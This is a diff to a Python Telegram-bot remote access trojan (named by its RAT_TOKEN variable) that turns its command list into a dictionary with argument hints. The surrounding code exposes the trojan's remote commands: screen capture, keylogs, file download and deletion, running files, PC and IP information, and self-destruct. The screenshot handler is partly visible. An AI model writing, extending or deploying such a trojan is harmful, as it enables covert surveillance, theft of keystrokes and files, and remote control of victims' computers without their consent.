@@ -14,9 +14,26 @@ me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
 token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
+
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
 known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
+
+# functionalities dictionary: command:arguments
+functionalities = { '/capture_pc' : '', 
+					'/cd':'<target_dir>', 
+					'/delete':'<target_file>', 
+					'/download':'<target_file>', 
+					'/ip_info':'', 
+					'/keylogs':'', 
+					'/ls':'[target_folder]', 
+					'/msg_box':'<text>', 
+					'/pc_info':'', 
+					'/play':'<youtube_videoId>', 
+					'/pwd':'', 
+					'/run_file':'<target_file>', 
+					'/self_destruct':'', 
+					'/to':''}
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
 if (argv[0]).endswith('.exe'):
@@ -68,11 +85,9 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 	if checkchat_id(chat_id):
-		functionalities = ['/capture_pc', '/cd', '/delete', '/download', '/ip_info', '/keylogs', '/ls', '/msg_box', '/pc_info', '/play', '/pwd', '/run_file', '/self_destruct', '/to'] # turn into dictionary?
 		if 'text' in msg:
 			command = msg['text']
 			response = ''
-			print command
 			if command == '/capture_pc':
 				bot.sendChatAction(chat_id, 'typing')
 				screenshot = ImageGrab.grab()
@@ -203,7 +218,7 @@ def handle(msg):
 						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
 						handle(msg)
 			elif command == '/help':
-				response = "\n".join(str(x) for x in functionalities)
+				response = "\n".join(str(x) for x in functionalities.keys())
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
 				handle(msg)
